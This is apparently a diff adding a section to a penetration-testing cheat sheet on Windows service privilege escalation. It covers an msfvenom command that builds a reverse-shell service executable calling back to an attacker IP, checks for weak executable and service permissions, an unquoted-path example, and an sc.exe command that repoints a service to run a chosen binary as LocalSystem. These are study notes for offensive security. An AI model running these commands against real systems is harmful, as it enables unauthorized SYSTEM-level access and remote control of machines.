@@ -59,6 +59,41 @@ icacl <path>
 
 ### Services
 
+```bash
+# Generate rev-shell service executable
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe-service -o my-service.exe
+```
+
+#### Executable permissions
+The executable associated with a service might have insecure permissions. The attacker modifing or replacing the executable can gain the privileges of the service's account.
+
+```powershell
+icacls <executable-path>                    # Show DACL of the executable
+```
+
+#### Unquoted paths
+If the service's executable points to an unquoted path with spaces, SCM tries to execute firt binary which is the first part of the unqoted path. This SCM feature is basically disgusting but it works. It allows an attacker to put malicious service binary in the "wrong" path and run it before a legit one will be executed.
+
+Example:
+
+```text
+Path        : C:\MyPrograms\Disk Sorter.exe
+Executed 1st: C:\MyPrograms\Disk.exe
+Executed 2nd: C:\MyPrograms\Disk Sorter.exe
+```
+
+#### Service permissions
+The service DACL might allow to reconfigure service settings. This allows an attacker to point a malicious executable to the service and even change the account which the executable is run with.
+
+To check a service DACL the [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) tool might be necessary.
+
+```powershell
+accesschk64.exe -qlc <svc-name>             # Check the service DACL
+
+# Reconfigure service: run :exe-path with Local SYSTEM account
+sc.exe config <svc-name binPath= "<exe-path" obj= LocalSystem
+```
+
 ### AlwaysInstallElevated
 `.msi` files are used to install applications on the system. They usually run with the privileges of the current user but sometimes it might be configured to run installation files with higher privileges from any user account. Malicious `.msi` files can be generated using `msfvenom` tool.
 
